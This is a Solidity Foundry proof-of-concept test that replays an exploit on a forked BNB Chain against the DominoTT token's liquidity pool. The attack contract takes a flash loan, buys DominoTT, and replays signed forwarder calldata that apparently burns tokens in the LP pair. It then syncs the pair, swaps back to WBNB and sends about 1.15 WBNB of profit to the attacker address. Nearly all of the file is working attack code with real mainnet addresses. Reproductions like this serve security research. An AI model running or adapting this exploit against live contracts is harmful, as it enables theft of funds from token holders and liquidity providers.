
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 34141659;
    uint256 constant TX_TIMESTAMP = 1701939573;
    uint256 constant TX_BLOCK_NUMBER = 34141660;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WBNB, "WBNB", 1152095510970497300);
    }
}

contract OurAttack {



    function attack() external payable {
        _attack();
    }

    function flashCallback() internal {
        _markCallback(0);
        IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.DominoTT).approve(Addresses.PancakeRouter, type(uint256).max);
        {
            if (100000000000000000 != 0) {
                IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, 100000000000000000);
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        100000000000000000,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.DominoTT),
                        address(this),
                        1701939573
                    );
            }
        }
        {
            bytes memory replayCallData =
                hex"47153f8200000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000835b45d38cbdccf99e609436ff38e31ac05bc5020000000000000000000000000dabdc92af35615443412a336344c591faed3f90000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c4b40000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000c4ac9650d8000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003842966c6800000000000000000000000000000000000000000001a784379d99db400000004f34b914d687195a73318ccc58d56d242b4dccf60000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041c360d1aaf9ba2e4fe0b927024d8b03edc4f8a2e3c0a0bead2b61555d902b4ba97d76d45719f20f851375b8276b0e26ab272619444105acace20f1bff9ad6145d1b00000000000000000000000000000000000000000000000000000000000000";
            (bool ok,) = Addresses.Forwarder.call(replayCallData);
            require(ok, "replay selector 0x47153f82 failed");
        }
        ICake_LP(Addresses.Cake_LP).sync();
        uint256 dominoTTBalanceOfAttackAttackContract = IERC20Like(Addresses.DominoTT).balanceOf(address(this));
        {
            if (dominoTTBalanceOfAttackAttackContract != 0) {
                IERC20Like(Addresses.DominoTT)
                    .approve(Addresses.PancakeRouter, dominoTTBalanceOfAttackAttackContract);
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        dominoTTBalanceOfAttackAttackContract,
                        0,
                        _addressArray2(Addresses.DominoTT, Addresses.WBNB),
                        address(this),
                        1701939573
                    );
            }
        }
        {
            Harness.vmExt().startPrank(address(this));
            IERC20Like(Addresses.WBNB).transfer(Addresses.DPP, 100000000000000000);

            Harness.vmExt().stopPrank();
        }
        uint256 wbnbBalanceOfAttackAttackContract = IERC20Like(Addresses.WBNB).balanceOf(address(this));
        IERC20Like(Addresses.WBNB).transfer(Addresses.attacker_eoa, wbnbBalanceOfAttackAttackContract);
    }

    function _attack() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.Forwarder, type(uint256).max);
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(14)),
                bytes32(uint256(78049522066681273149085505302928049852973399952))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(15)),
                bytes32(uint256(452186032509107894282476712887395940045272501494))
            );
        {
            bytes memory flashLoanProof =
                hex"47153f8200000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000835b45d38cbdccf99e609436ff38e31ac05bc5020000000000000000000000000dabdc92af35615443412a336344c591faed3f90000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c4b40000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000c4ac9650d8000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003842966c6800000000000000000000000000000000000000000001a784379d99db400000004f34b914d687195a73318ccc58d56d242b4dccf60000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041c360d1aaf9ba2e4fe0b927024d8b03edc4f8a2e3c0a0bead2b61555d902b4ba97d76d45719f20f851375b8276b0e26ab272619444105acace20f1bff9ad6145d1b00000000000000000000000000000000000000000000000000000000000000";
            IDPP(Addresses.DPP).flashLoan(100000000000000000, 0, address(this), flashLoanProof);
        }
    }

    receive() external payable {}

    function DPPFlashLoanCall(address arg0, uint256 amount, uint256 amount1, bytes calldata arg3) external payable {
        arg0;
        amount;
        amount1;
        arg3;
        flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x9c2e37ef) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant DominoTT = 0x0DaBDC92aF35615443412A336344c591FaEd3f90;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant Cake_LP = 0x4f34b914D687195A73318ccC58D56D242b4dCcF6;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant DPP = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address internal constant Forwarder = 0x7C4717039B89d5859c4Fbb85EDB19A6E2ce61171;
    address internal constant attacker_eoa = 0x835B45D38cbDccf99E609436FF38E31Ac05bc502;
    address internal constant TokenERC20 = 0xaE5be6d490C47c7417e91B7911d3A0Ce3553438d;
    address internal constant attack_contract = 0xaed80b8a821607981e5E58B7A753A3336C0bFd6f;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
}

struct Abi_execute_Param0 {
    address field0;
    address field1;
    uint256 field2;
    uint256 field3;
    uint256 field4;
    bytes field5;
}

interface ICake_LP {
    function sync() external;
}

interface IDPP {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IForwarder {
    function execute(Abi_execute_Param0 calldata, bytes calldata) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
